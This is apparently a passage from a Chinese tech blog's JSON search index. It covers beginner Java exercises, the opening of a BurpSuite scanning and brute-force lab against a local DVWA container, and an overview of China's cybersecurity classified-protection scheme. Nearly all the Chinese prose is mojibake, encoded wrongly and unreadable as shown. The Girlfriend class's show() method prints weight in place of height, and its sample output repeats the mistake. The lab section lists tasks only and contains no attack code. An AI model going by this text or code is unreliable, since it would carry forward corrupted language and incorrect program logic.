¼(price)å’Œé¢œè‰²(color)ä¸‰ä¸ªå±æ€§ï¼Œæœ‰æ‰“ç”µè¯call()å’ŒsendMessage()ä¸¤ä¸ªåŠŸèƒ½ã€‚\n2ã€å®šä¹‰ä¸€ä¸ªå¥³æœ‹å‹ç±»ã€‚å¥³æœ‹å‹çš„å±æ€§åŒ…å«ï¼šå§“åï¼Œèº«é«˜ï¼Œä½“é‡ã€‚è¡Œä¸ºåŒ…å«ï¼šæ´—è¡£æœwash()ï¼Œåšé¥­cook()ã€‚\n1. æ‰‹æœºç±» è¯·å®šä¹‰å‡ºæ‰‹æœºç±»ï¼Œç±»ä¸­è¦æœ‰ç©ºå‚ã€æœ‰å‚æ„é€ æ–¹æ³•ï¼Œset/getæ–¹æ³•ã€‚\nå®šä¹‰æµ‹è¯•ç±»ï¼Œåœ¨ä¸»æ–¹æ³•ä¸­ä½¿ç”¨ç©ºå‚æ„é€ åˆ›å»ºå¯¹è±¡ï¼Œä½¿ç”¨setæ–¹æ³•èµ‹å€¼ã€‚\nè°ƒç”¨å¯¹è±¡çš„ä¸¤ä¸ªåŠŸèƒ½ï¼Œæ‰“å°æ•ˆæœå¦‚ä¸‹ï¼š\næ­£åœ¨ä½¿ç”¨ä»·æ ¼ä¸º3998å…ƒé»‘è‰²çš„å°ç±³æ‰‹æœºæ‰“ç”µè¯\u0026hellip;. æ­£åœ¨ä½¿ç”¨ä»·æ ¼ä¸º3998å…ƒé»‘è‰²çš„å°ç±³æ‰‹æœºå‘çŸ­ä¿¡\u0026hellip;.\nåœ¨ideaç¼–è¾‘å™¨ä¸­ï¼Œå®šä¹‰å±æ€§åï¼Œå¯ä»¥é€šè¿‡å³é”®æˆ–è€…Alt + Insertå¿«æ·é”®å¿«é€Ÿç”Ÿæˆæ„é€ æ–¹æ³•å’Œget/setæ–¹æ³•\næ‰‹æœºç±»ï¼šPhone\npublic class Phone { private String brand; private double price; private String color; //å®šä¹‰æ— å‚æ„é€ æ–¹æ³• public Phone() { System.out.println(\u0026#34;è°ƒç”¨æ— å‚æ„é€ æ–¹æ³•\u0026#34;); } //å®šä¹‰æœ‰å‚æ„é€ æ–¹æ³• public Phone(String brand, double price, String color) { System.out.println(\u0026#34;è°ƒç”¨æœ‰å‚æ„é€ æ–¹æ³•\u0026#34;); this.brand = brand; this.price = price; this.color = color; } public String getBrand() { return brand; } public void setBrand(String brand) { this.brand = brand; } public double getPrice() { return price; } public void setPrice(double price) { this.price = price; } public String getColor() { return color; } public void setColor(String color) { this.color = color; } //æ‰“ç”µè¯è¡Œä¸º public void call() { System.out.println(\u0026#34;æ­£åœ¨ä½¿ç”¨ä»·æ ¼ä¸ºï¼š\u0026#34; + this.price + \u0026#34;å…ƒ\u0026#34; + this.color + \u0026#34;çš„\u0026#34; + this.brand + \u0026#34;æ‰‹æœºæ‰“ç”µè¯...\u0026#34;); } //å‘çŸ­ä¿¡è¡Œä¸º public void sendMessage() { System.out.println(\u0026#34;æ­£åœ¨ä½¿ç”¨ä»·æ ¼ä¸ºï¼š\u0026#34; + this.price + \u0026#34;å…ƒ\u0026#34; + this.color + \u0026#34;çš„\u0026#34; + this.brand + \u0026#34;æ‰‹æœºå‘çŸ­ä¿¡...\u0026#34;); } } æµ‹è¯•ç±»ï¼šTestPhone\npublic class TestPhone { public static void main(String[] args) { Phone phone = new Phone(); phone.setBrand(\u0026#34;å°ç±³\u0026#34;); phone.setPrice(3998); phone.setColor(\u0026#34;é»‘è‰²\u0026#34;); phone.call(); phone.sendMessage(); } } ç¨‹åºè¾“å‡ºï¼š\nè°ƒç”¨æ— å‚æ„é€ æ–¹æ³• æ­£åœ¨ä½¿ç”¨ä»·æ ¼ä¸ºï¼š3998.0å…ƒé»‘è‰²çš„å°ç±³æ‰‹æœºæ‰“ç”µè¯... æ­£åœ¨ä½¿ç”¨ä»·æ ¼ä¸ºï¼š3998.0å…ƒé»‘è‰²çš„å°ç±³æ‰‹æœºå‘çŸ­ä¿¡... 2. å¥³æœ‹å‹ç±»ã€‚ æˆ‘å¥³æœ‹å‹å«å‡¤å§,èº«é«˜155.0å˜ç±³,ä½“é‡130.0æ–¤ å¥³æœ‹å‹å¸®æˆ‘æ´—è¡£æœ å¥³æœ‹å‹ç»™æˆ‘åšé¥­\nå¥³æœ‹å‹ç±»ï¼šGirlFriend\npublic class Girlfriend { private String name; private double height; private double weight; public String getName() { return name; } public Girlfriend(String name, double height, double weight) { this.name = name; this.height = height; this.weight = weight; } public void setName(String name) { this.name = name; } public double getHeight() { return height; } public void setHeight(double height) { this.height = height; } public double getWeight() { return weight; } public void setWeight(double weight) { this.weight = weight; } public void show() { System.out.println(\u0026#34;æˆ‘æ˜¯\u0026#34; + getName() + \u0026#34;ã€‚æˆ‘çš„èº«é«˜æ˜¯ï¼š\u0026#34; + getWeight() + \u0026#34;å˜ç±³, \u0026#34; + \u0026#34;æˆ‘çš„ä½“é‡æ˜¯\u0026#34; + getWeight() + \u0026#34;æ–¤...\u0026#34;); } public void wash() { System.out.println(\u0026#34;æˆ‘ä¼šæ´—è¡£æœ\u0026#34;); } public void cook() { System.out.println(\u0026#34;æˆ‘è¿˜ä¼šåšé¥­\u0026#34;); } } æµ‹è¯•ç±»ï¼šTestGirlfriend\npublic class TestGirlFriend { public static void main(String[] args) { Girlfriend girlfriend = new Girlfriend(\u0026#34;å‡¤å§\u0026#34;, 155.0, 130); girlfriend.show(); girlfriend.wash(); girlfriend.cook(); } } ç¨‹åºè¾“å‡ºï¼š\næˆ‘æ˜¯å‡¤å§ã€‚æˆ‘çš„èº«é«˜æ˜¯ï¼š130.0å˜ç±³, æˆ‘çš„ä½“é‡æ˜¯130.0æ–¤... æˆ‘ä¼šæ´—è¡£æœ æˆ‘è¿˜ä¼šåšé¥­ ","permalink":"https://senmer.github.io/zh/posts/tech/java/java-%E7%B1%BB/","summary":"\u003cp\u003e1ã€å®šä¹‰æ‰‹æœºç±»ï¼Œæ‰‹æœºæœ‰å“ç‰Œ(brand),ä»·æ ¼(price)å’Œé¢œè‰²(color)ä¸‰ä¸ªå±æ€§ï¼Œæœ‰æ‰“ç”µè¯call()å’ŒsendMessage()ä¸¤ä¸ªåŠŸèƒ½ã€‚\u003c/p\u003e\n\u003cp\u003e2ã€å®šä¹‰ä¸€ä¸ªå¥³æœ‹å‹ç±»ã€‚å¥³æœ‹å‹çš„å±æ€§åŒ…å«ï¼šå§“åï¼Œèº«é«˜ï¼Œä½“é‡ã€‚è¡Œä¸ºåŒ…å«ï¼šæ´—è¡£æœwash()ï¼Œåšé¥­cook()ã€‚\u003c/p\u003e","title":"java-ç±»"},{"content":"1ã€ç¼–å†™ä¸€ä¸ª Java ç¨‹åºï¼Œæ±‚å‡ºä» 1 åˆ° 100 ä¸­æ‰€æœ‰å¶æ•°çš„å’Œã€‚\n2ã€ç¼–å†™ä¸€ä¸ª Java ç¨‹åºï¼Œæ±‚å‡ºä¸€ä¸ªç»™å®šæ­£æ•´æ•°çš„æ‰€æœ‰å› æ•°ã€‚\n3ã€ç»™å®šä¸€ä¸ªæ•´å‹æ•°ç»„ï¼Œç¼–å†™ä¸€ä¸ª Java ç¨‹åºï¼Œå°†è¯¥æ•°ç»„ä¸­çš„æ‰€æœ‰å¥‡æ•°å…ƒç´ å­˜å‚¨åˆ°ä¸€ä¸ªæ–°æ•°ç»„ä¸­ï¼Œå¹¶è¾“å‡ºæ–°æ•°ç»„ä¸­çš„å…ƒç´ ã€‚\nä»€ä¹ˆæ˜¯å› æ•°? åœ¨æ•°å­¦ä¸­ï¼Œä¸€ä¸ªæ­£æ•´æ•°çš„å› æ•°ï¼Œæ˜¯æŒ‡èƒ½å¤Ÿæ•´é™¤è¯¥æ•°ä¸”å¤§äºç­‰äº 1 çš„æ­£æ•´æ•°ï¼Œä¹Ÿç§°ä¸ºè¯¥æ•°çš„çº¦æ•°ã€‚ä¾‹å¦‚ï¼Œ6 çš„å› æ•°ä¸º 1ã€2ã€3ã€6ã€‚è€Œä¸€ä¸ªæ­£æ•´æ•°ä¸æ˜¯è´¨æ•°æ—¶ï¼Œå…¶å› æ•°è‡³å°‘åŒ…æ‹¬ 1 å’Œæœ¬èº«ä¸¤ä¸ªå› æ•°ã€‚\n1. æ±‚å’Œ public class GetNum { public static void main(String[] args) { int num = 100; //æ±‚å’Œæ€»æ•° int sum = 0; //ç´¯åŠ å’Œ for (int i = 1; i \u0026lt;= num; i++) if (i % 2 == 0) { sum += i; } System.out.println(\u0026#34;1-100çš„æ‰€æœ‰å¶æ•°å’Œä¸ºï¼š\u0026#34;+sum); } } è¾“å‡ºç»“æœï¼š\n1-100çš„æ‰€æœ‰å¶æ•°å’Œä¸ºï¼š2550 2. æ±‚å› æ•° import java.util.Scanner; public class GetFactor { public static void main(String[] args) { Scanner input = new Scanner(System.in); System.out.print(\u0026#34;è¯·è¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°ï¼š\u0026#34;); int num = input.nextInt(); System.out.print(num + \u0026#34;çš„å› æ•°æœ‰ï¼š\u0026#34;); for (int i = 1; i \u0026lt;= num; i++) { if (num % i == 0) { System.out.print(i + \u0026#34; \u0026#34;); } } } } è¾“å‡ºç»“æœï¼š\nè¯·è¾“å…¥ä¸€ä¸ªæ­£æ•´æ•°ï¼š4 4çš„å› æ•°æœ‰ï¼š1 2 4 3. æ±‚å¥‡æ•° import java.util.Arrays; public class GetOddArray { public static void main(String[] args) { int[] array= {1, 2, 3, 4, 5, 6, 7, 8, 9}; int[] oddArray = getOddArray(array); System.out.println(\u0026#34;åŸæ•°ç»„ï¼š\u0026#34; + Arrays.toString(array)); System.out.println(\u0026#34;å¥‡æ•°æ•°ç»„ï¼š\u0026#34; + Arrays.toString(oddArray)); } public static int[] getOddArray(int[] arr){ //è·å¾—å¥‡æ•°ä¸ªæ•°ä»¥åˆ›å»ºå“åº”å¤§å°çš„æ•°ç»„ int count = 0; //å¥‡æ•°ä¸ªæ•° for (int i = 0; i \u0026lt; arr.length; i++){ if (arr[i] % 2 != 0) { count++; } } //å­˜å‚¨å¹¶è¿”å›æ‰€æœ‰å¥‡æ•° int[] oddArr = new int[count]; int index=0; for (int i = 0; i \u0026lt; arr.length; i++) { if (arr[i] % 2 != 0) { oddArr[index++] = arr[i]; } } return oddArr; } } è¾“å‡ºç»“æœï¼š\nåŸæ•°ç»„ï¼š[1, 2, 3, 4, 5, 6, 7, 8, 9] å¥‡æ•°æ•°ç»„ï¼š[1, 3, 5, 7, 9] ","permalink":"https://senmer.github.io/zh/posts/tech/java/java-%E5%BE%AA%E7%8E%AF/","summary":"\u003cp\u003e1ã€ç¼–å†™ä¸€ä¸ª Java ç¨‹åºï¼Œæ±‚å‡ºä» 1 åˆ° 100 ä¸­æ‰€æœ‰å¶æ•°çš„å’Œã€‚\u003c/p\u003e\n\u003cp\u003e2ã€ç¼–å†™ä¸€ä¸ª Java ç¨‹åºï¼Œæ±‚å‡ºä¸€ä¸ªç»™å®šæ­£æ•´æ•°çš„æ‰€æœ‰å› æ•°ã€‚\u003c/p\u003e\n\u003cp\u003e3ã€ç»™å®šä¸€ä¸ªæ•´å‹æ•°ç»„ï¼Œç¼–å†™ä¸€ä¸ª Java ç¨‹åºï¼Œå°†è¯¥æ•°ç»„ä¸­çš„æ‰€æœ‰å¥‡æ•°å…ƒç´ å­˜å‚¨åˆ°ä¸€ä¸ªæ–°æ•°ç»„ä¸­ï¼Œå¹¶è¾“å‡ºæ–°æ•°ç»„ä¸­çš„å…ƒç´ ã€‚\u003c/p\u003e","title":"java-å¾ªç¯"},{"content":"1ã€ä½¿ç”¨Discover ContentåŠŸèƒ½çˆ¬å–ä»»æ„ç«™ç‚¹çš„ç›®å½•ï¼Œç»™å‡ºçˆ¬å–è¿‡ç¨‹çš„è¯´æ˜æ–‡æ¡£ã€ç«™ç‚¹æ ‘æˆªå›¾ï¼›\n2ã€åˆ†åˆ«ä½¿ç”¨burp Scançš„ä¸»åŠ¨æ‰«æå’Œè¢«åŠ¨æ‰«æåŠŸèƒ½å¯¹DVWAç«™ç‚¹è¿›è¡Œæ‰«æï¼Œè¾“å‡ºæ‰«ææŠ¥å‘Šï¼›\n3ã€åˆ†åˆ«ä½¿ç”¨burpçš„ç‹™å‡»æ‰‹æ¨¡å¼ï¼ˆSniperï¼‰å’Œé›†æŸç‚¸å¼¹æ¨¡å¼ï¼ˆCluster bombï¼‰ å¯¹DVWAçš„Brute Forceæ¨¡å—è¿›è¡Œçˆ†ç ´\n1 å®éªŒç¯å¢ƒ è½¯ä»¶åç§° ç‰ˆæœ¬ éƒ¨ç½²æ–¹å¼ IP BurpSuite professional v2.0 windowså®‰è£… 172.31.5.1 DVWA v1.10 Development docker run -d -p 80:80 \u0026ndash;name dvwa docker.io/sagikazarmark/dvwa 172.31.5.7 2 Discover Content dvwa ç«™ç‚¹åœ°å€\n172.31.5.1\t","permalink":"https://senmer.github.io/zh/posts/tech/burp/burpsuite%E6%89%AB%E6%8F%8F%E4%B8%8E%E7%88%86%E7%A0%B4/","summary":"\u003cp\u003e1ã€ä½¿ç”¨Discover ContentåŠŸèƒ½çˆ¬å–ä»»æ„ç«™ç‚¹çš„ç›®å½•ï¼Œç»™å‡ºçˆ¬å–è¿‡ç¨‹çš„è¯´æ˜æ–‡æ¡£ã€ç«™ç‚¹æ ‘æˆªå›¾ï¼›\u003c/p\u003e\n\u003cp\u003e2ã€åˆ†åˆ«ä½¿ç”¨burp Scançš„ä¸»åŠ¨æ‰«æå’Œè¢«åŠ¨æ‰«æåŠŸèƒ½å¯¹DVWAç«™ç‚¹è¿›è¡Œæ‰«æï¼Œè¾“å‡ºæ‰«ææŠ¥å‘Šï¼›\u003c/p\u003e\n\u003cp\u003e3ã€åˆ†åˆ«ä½¿ç”¨burpçš„ç‹™å‡»æ‰‹æ¨¡å¼ï¼ˆSniperï¼‰å’Œé›†æŸç‚¸å¼¹æ¨¡å¼ï¼ˆCluster bombï¼‰ å¯¹DVWAçš„Brute Forceæ¨¡å—è¿›è¡Œçˆ†ç ´\u003c/p\u003e","title":"BurpSuiteæ‰«æä¸çˆ†ç ´"},{"content":"ç­‰çº§ä¿æŠ¤\u0026amp;é£é™©è¯„ä¼°ï¼šäº†è§£åŸºæœ¬æµ‹è¯„æµç¨‹ï¼ŒçŸ¥é“å„è§’è‰²å²—ä½åœ¨æµ‹è¯„å·¥ä½œä¸­çš„èŒè´£ï¼Œå­¦ä¹ å›½æ ‡æ–‡ä»¶\n1 ç­‰çº§ä¿æŠ¤ 1.1 ç­‰çº§ä¿æŠ¤æ¦‚å¿µ ä¿¡æ¯å®‰å…¨ç­‰çº§ä¿æŠ¤æ˜¯æŒ‡å¯¹å›½å®¶ç§˜å¯†ä¿¡æ¯ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡åŠå…¬æ°‘çš„ä¸“æœ‰ä¿¡æ¯ä»¥åŠå…¬å¼€ä¿¡æ¯å’Œå­˜å‚¨ã€ä¼ è¾“ã€å¤„ç†è¿™äº›ä¿¡æ¯çš„ä¿¡æ¯ç³»ç»Ÿåˆ†ç­‰çº§å®è¡Œå®‰å…¨ä¿æŠ¤ï¼Œå¯¹ä¿¡æ¯ç³»ç»Ÿä¸­ä½¿ç”¨çš„ä¿¡æ¯å®‰å…¨äº§å“å®è¡ŒæŒ‰ç­‰çº§ç®¡ç†ï¼Œå¯¹ä¿¡æ¯ç³»ç»Ÿä¸­å‘ç”Ÿçš„ä¿¡æ¯å®‰å…¨äº‹ä»¶åˆ†ç­‰çº§å“åº”ã€å¤„ç½®ã€‚\n1.2 ç­‰çº§ä¿æŠ¤ä¾æ® ç­‰çº§ä¿æŠ¤å·¥ä½œå¼€å±•çš„ä¾æ®æ˜¯ã€Šä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹\nç¬¬äºŒåä¸€æ¡\nå›½å®¶å®è¡Œç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦ã€‚ç½‘ç»œè¿è¥è€…åº”å½“æŒ‰ç…§ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦çš„è¦æ±‚ï¼Œå±¥è¡Œä¸‹åˆ—å®‰å…¨ä¿æŠ¤ä¹‰åŠ¡ï¼Œä¿éšœç½‘ç»œå…å—å¹²æ‰°ã€ç ´åæˆ–è€…æœªç»æˆæƒçš„è®¿é—®ï¼Œé˜²æ­¢ç½‘ç»œæ•°æ®æ³„éœ²æˆ–è€…è¢«çªƒå–ã€ç¯¡æ”¹ï¼š ï¼ˆä¸€ï¼‰åˆ¶å®šå†…éƒ¨å®‰å…¨ç®¡ç†åˆ¶åº¦å’Œæ“ä½œè§„ç¨‹ï¼Œç¡®å®šç½‘ç»œå®‰å…¨è´Ÿè´£äººï¼Œè½å®ç½‘ç»œå®‰å…¨ä¿æŠ¤è´£ä»»ï¼› ï¼ˆäºŒï¼‰é‡‡å–é˜²èŒƒè®¡ç®—æœºç—…æ¯’å’Œç½‘ç»œæ”»å‡»ã€ç½‘ç»œä¾µå…¥ç­‰å±å®³ç½‘ç»œå®‰å…¨è¡Œä¸ºçš„æŠ€æœ¯æªæ–½ï¼› ï¼ˆä¸‰ï¼‰é‡‡å–ç›‘æµ‹ã€è®°å½•ç½‘ç»œè¿è¡ŒçŠ¶æ€ã€ç½‘ç»œå®‰å…¨äº‹ä»¶çš„æŠ€æœ¯æªæ–½ï¼Œå¹¶æŒ‰ç…§è§„å®šç•™å­˜ç›¸å…³çš„ç½‘ç»œæ—¥å¿—ä¸å°‘ äºå…­ä¸ªæœˆï¼› ï¼ˆå››ï¼‰é‡‡å–æ•°æ®åˆ†ç±»ã€é‡è¦æ•°æ®å¤‡ä»½å’ŒåŠ å¯†ç­‰æªæ–½ï¼› ï¼ˆäº”ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–ä¹‰åŠ¡ã€‚\nç¬¬ä¸‰åä¸€æ¡\nå›½å®¶å¯¹å…¬å…±é€šä¿¡å’Œä¿¡æ¯æœåŠ¡ã€èƒ½æºã€äº¤é€šã€æ°´åˆ©ã€é‡‘èã€å…¬å…±æœåŠ¡ã€ç”µå­æ”¿åŠ¡ç­‰é‡è¦è¡Œä¸šå’Œé¢†åŸŸï¼Œä»¥åŠå…¶ä»–ä¸€æ—¦é­åˆ°ç ´åã€ä¸§å¤±åŠŸèƒ½æˆ–è€…æ•°æ®æ³„éœ²ï¼Œå¯èƒ½ä¸¥é‡å±å®³å›½å®¶å®‰å…¨ã€å›½è®¡æ°‘ç”Ÿã€å…¬å…±åˆ©ç›Šçš„å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ï¼Œåœ¨ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤åˆ¶åº¦çš„åŸºç¡€ä¸Šï¼Œå®è¡Œé‡ç‚¹ä¿æŠ¤ã€‚å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½çš„å…·ä½“èŒƒå›´å’Œå®‰å…¨ä¿æŠ¤åŠæ³•ç”±å›½åŠ¡é™¢åˆ¶å®šã€‚å›½å®¶é¼“åŠ±å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ä»¥å¤–çš„ç½‘ç»œè¿è¥è€…è‡ªæ„¿å‚ä¸å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ä¿æŠ¤ä½“ç³»ã€‚\nä¼´éšç€ã€Šä¸­åäººæ°‘å…±å’Œå›½ç½‘ç»œå®‰å…¨æ³•ã€‹çš„æ­£å¼å‘å¸ƒå’Œå®æ–½ï¼Œç­‰çº§ä¿æŠ¤åˆ¶åº¦ä»ä¸€ä¸ªè§„èŒƒæ€§åŠ¨ä½œä¸Šå‡åˆ°äº†æ³•å¾‹å±‚é¢ï¼Œç¡®ç«‹äº†å…¶åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„åŸºç¡€ã€æ ¸å¿ƒåœ°ä½ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½ç›¸å…³å•ä½ä¸æŒ‰è¦æ±‚å±¥è¡Œç­‰ä¿æµ‹è¯„å·¥ä½œå³æ˜¯è¿æ³•è¡Œä¸ºã€‚\n1.3 ä¸ºä»€ä¹ˆè¦å¼ºåˆ¶å®è¡Œç­‰çº§ä¿æŠ¤ å›½å®¶å¼ºåˆ¶æ¨è¿›å®è¡Œç­‰ä¿åˆ¶åº¦çš„åŸå› æ¥è‡ªå†…ã€å¤–ä¸¤ä¸ªéƒ¨åˆ†ï¼š\nå†…éƒ¨å› ç´ ï¼šéšç€ä¿¡æ¯åŒ–å»ºè®¾å·¥ä½œçš„å‘å±•å’Œæ¨è¿›ï¼Œç½‘ç»œå®‰å…¨å·¥ä½œä¹Ÿéœ€è¦åŒæ­¥æ¨è¿›ï¼Œä»¥æ­¤æ¥ä¿éšœå›½å®¶é‡è¦è¡Œä¸šå’Œå…³é”®ç¯èŠ‚çš„å®‰å…¨ç³»æ•°ã€‚ å¤–éƒ¨å› ç´ ï¼šæ”»å‡»æŠ€æœ¯ä¸æ–­å‘å±•å’Œè¿­ä»£ï¼Œå¢ƒå¤–æ•Œå¯¹åŠ¿åŠ›çš„å…¥ä¾µå½¢åŠ¿æ—¥ç›Šä¸¥å³»ã€‚ 1.4 ç­‰çº§ä¿æŠ¤å¯¹è±¡ ç­‰çº§ä¿æŠ¤å¯¹è±¡æ˜¯æŒ‡ç½‘ç»œå®‰å…¨ç­‰çº§ä¿æŠ¤å·¥ä½œä¸­çš„å¯¹è±¡ï¼Œé€šå¸¸æ˜¯æŒ‡ç”±è®¡ç®—æœºæˆ–è€…å…¶ä»–ä¿¡æ¯ç»ˆç«¯åŠç›¸å…³è®¾å¤‡ç»„æˆçš„æŒ‰ç…§ä¸€å®šçš„è§„åˆ™å’Œç¨‹åºå¯¹ä¿¡æ¯è¿›è¡Œæ”¶é›†ã€å­˜å‚¨ã€ä¼ è¾“ã€äº¤æ¢ã€å¤„ç†çš„ç³»ç»Ÿï¼Œä¸»è¦åŒ…æ‹¬åŸºç¡€ä¿¡æ¯ç½‘ç»œã€äº‘è®¡ç®—å¹³å°/ç³»ç»Ÿã€å¤§æ•°æ®åº”ç”¨/å¹³å°/èµ„æºã€ç‰©è”ç½‘(IoT)ã€å·¥ä¸šæ§åˆ¶ç³»ç»Ÿå’Œé‡‡ç”¨ç§»åŠ¨äº’è”æŠ€æœ¯çš„ç³»ç»Ÿç­‰ï¼ˆç®€ç§°ï¼šäº‘å¤§ç‰©ç§»å·¥ï¼‰ã€‚\n1.5 å®‰å…¨ä¿æŠ¤ç­‰çº§ ç­‰çº§ä¿æŠ¤å¯¹è±¡æ ¹æ®å…¶åœ¨å›½å®¶å®‰å…¨ï¼Œç»æµå»ºè®¾ï¼Œç¤¾ä¼šç”Ÿæ´»ä¸­çš„é‡è¦ç¨‹åº¦ï¼Œé­åˆ°ç ´ååå¯¹å›½å®¶å®‰å…¨ã€ç¤¾ä¼šç§©åºã€å…¬å…±åˆ©ç›Šä»¥åŠå…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡çš„åˆæ³•æƒç›Šçš„å±å®³ç¨‹åº¦ç­‰ï¼Œç”±ä½åˆ°é«˜è¢«åˆ’åˆ†ä¸ºäº”ä¸ªå®‰å…¨ä¿æŠ¤ç­‰çº§ã€‚\nç¬¬äº”ä¸ªç­‰çº§æ¶‰åŠå›½å®¶å®‰å…¨ï¼Œæœªåœ¨å›½æ ‡æ–‡ä»¶åˆ—å‡ºå…·ä½“å†…å®¹ï¼Œä¸”æ™®é€šäººä¸€èˆ¬åŸºç¡€ä¸åˆ°\nç­‰çº§ å®šä¹‰ å®‰å…¨ä¿æŠ¤èƒ½åŠ› ç¬¬ä¸€ çº§ï¼š ç”¨æˆ· è‡ªä¸» ä¿æŠ¤ çº§ ç­‰çº§ä¿æŠ¤å¯¹è±¡å—åˆ°ç ´ååï¼Œ ä¼šå¯¹å…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡ çš„åˆæ³•æƒç›Šé€ æˆæŸå®³ï¼Œä½†ä¸ æŸå®³å›½å®¶å®‰å…¨ã€ç¤¾ä¼šç§©åºå’Œ å…¬å…±åˆ©ç›Šã€‚ åº”èƒ½å¤Ÿé˜²æŠ¤å…å—æ¥è‡ªä¸ªäººçš„ã€æ‹¥æœ‰å¾ˆå°‘èµ„æºçš„å¨èƒæºå‘ èµ·çš„æ¶æ„æ”»å‡»ã€ä¸€èˆ¬çš„è‡ªç„¶ç¾éš¾ï¼Œä»¥åŠå…¶ä»–ç›¸å½“å±å®³ç¨‹ åº¦çš„å¨èƒæ‰€é€ æˆçš„å…³é”®èµ„æºæŸå®³ï¼Œåœ¨è‡ªèº«é­åˆ°æŸå®³åï¼Œ èƒ½å¤Ÿæ¢å¤éƒ¨åˆ†åŠŸèƒ½ã€‚ ç¬¬äºŒ çº§ï¼š ç³»ç»Ÿ å®¡è®¡ ä¿æŠ¤ çº§ ç­‰çº§ä¿æŠ¤å¯¹è±¡å—åˆ°ç ´ååï¼Œ ä¼šå¯¹å…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡ çš„åˆæ³•æƒç›Šäº§ç”Ÿä¸¥é‡æŸå®³ï¼Œ æˆ–è€…å¯¹ç¤¾ä¼šç§©åºå’Œå…¬å…±åˆ©ç›Š é€ æˆæŸå®³ï¼Œä½†ä¸æŸå®³å›½å®¶å®‰ å…¨ã€‚ åº”èƒ½å¤Ÿé˜²æŠ¤å…å—æ¥è‡ªå¤–éƒ¨å°å‹ç»„ç»‡çš„ã€æ‹¥æœ‰å°‘é‡èµ„æºçš„ å¨èƒæºå‘èµ·çš„æ¶æ„æ”»å‡»ã€ä¸€èˆ¬çš„è‡ªç„¶ç¾éš¾ï¼Œä»¥åŠå…¶ä»–ç›¸ å½“å±å®³ç¨‹åº¦çš„å¨èƒæ‰€é€ æˆçš„é‡è¦èµ„æºæŸå®³ï¼Œèƒ½å¤Ÿå‘ç°é‡ è¦çš„å®‰å…¨æ¼æ´å’Œå¤„ç½®å®‰å…¨äº‹ä»¶ï¼Œåœ¨è‡ªèº«é­åˆ°æŸå®³åï¼Œèƒ½ å¤Ÿåœ¨ä¸€æ®µæ—¶é—´å†…æ¢å¤éƒ¨åˆ†åŠŸèƒ½ã€‚ ç¬¬ä¸‰ çº§ï¼š å®‰å…¨ æ ‡è®° ä¿æŠ¤ çº§ ç­‰çº§ä¿æŠ¤å¯¹è±¡å—åˆ°ç ´ååï¼Œ ä¼šå¯¹å…¬æ°‘ã€æ³•äººå’Œå…¶ä»–ç»„ç»‡ çš„åˆæ³•æƒç›Šäº§ç”Ÿç‰¹åˆ«ä¸¥é‡æŸ å®³ï¼Œæˆ–è€…å¯¹ç¤¾ä¼šç§©åºå’Œå…¬å…± åˆ©ç›Šé€ æˆä¸¥é‡æŸå®³ï¼Œæˆ–è€…å¯¹ å›½å®¶å®‰å…¨é€ æˆæŸå®³ã€‚ åº”èƒ½å¤Ÿåœ¨ç»Ÿä¸€å®‰å…¨ç­–ç•¥ä¸‹é˜²æŠ¤å…å—æ¥è‡ªå¤–éƒ¨æœ‰ç»„ç»‡çš„å›¢ ä½“ã€æ‹¥æœ‰è¾ƒä¸ºä¸°å¯Œèµ„æºçš„å¨èƒæºå‘èµ·çš„æ¶æ„æ”»å‡»ã€è¾ƒä¸º ä¸¥é‡çš„è‡ªç„¶ç¾éš¾ï¼Œä»¥åŠå…¶ä»–ç›¸å½“å±å®³ç¨‹åº¦çš„å¨èƒæ‰€é€ æˆ çš„ä¸»è¦èµ„æºæŸå®³,èƒ½å¤ŸåŠæ—¶å‘ç°ã€ç›‘æµ‹æ”»å‡»è¡Œä¸ºå’Œå¤„ç½® å®‰å…¨äº‹ä»¶ï¼Œåœ¨è‡ªèº«é­åˆ°æŸå®³åï¼Œèƒ½å¤Ÿè¾ƒå¿«æ¢å¤ç»å¤§éƒ¨åˆ† åŠŸèƒ½ã€‚ ç¬¬å›› çº§ï¼š ç»“æ„ åŒ–ä¿ æŠ¤çº§ ç­‰çº§ä¿æŠ¤å¯¹è±¡å—åˆ°ç ´ååï¼Œ ä¼šå¯¹ç¤¾ä¼šç§©åºå’Œå…¬å…±åˆ©ç›Šé€  æˆç‰¹åˆ«ä¸¥é‡æŸå®³ï¼Œæˆ–è€…å¯¹å›½ å®¶å®‰å…¨é€ æˆä¸¥é‡æŸå®³ã€‚ åº”èƒ½å¤Ÿåœ¨ç»Ÿä¸€å®‰å…¨ç­–ç•¥ä¸‹é˜²æŠ¤å…å—æ¥è‡ªå›½å®¶çº§åˆ«çš„ã€æ•Œ å¯¹ç»„ç»‡çš„ã€æ‹¥æœ‰ä¸°å¯Œèµ„æºçš„å¨èƒæºå‘èµ·çš„æ¶æ„æ”»å‡»ï¼Œä¸¥ é‡çš„è‡ªç„¶ç¾éš¾ï¼Œ,ä»¥åŠå…¶ä»–ç›¸å½“å±å®³ç¨‹åº¦çš„å¨èƒæ‰€é€ æˆ çš„èµ„æºæŸå®³ï¼Œèƒ½å¤ŸåŠæ—¶å‘ç°ã€ç›‘æµ‹å‘ç°æ”»å‡»è¡Œä¸ºå’Œå®‰å…¨ äº‹ä»¶ï¼Œåœ¨è‡ªèº«é­åˆ°æŸå®³åï¹èƒ½å¤Ÿè¿…é€Ÿæ¢å¤æ‰€æœ‰åŠŸèƒ½ã€‚ ç¬¬äº” çº§ï¼š è®¿é—® éªŒè¯ ä¿æŠ¤ çº§ 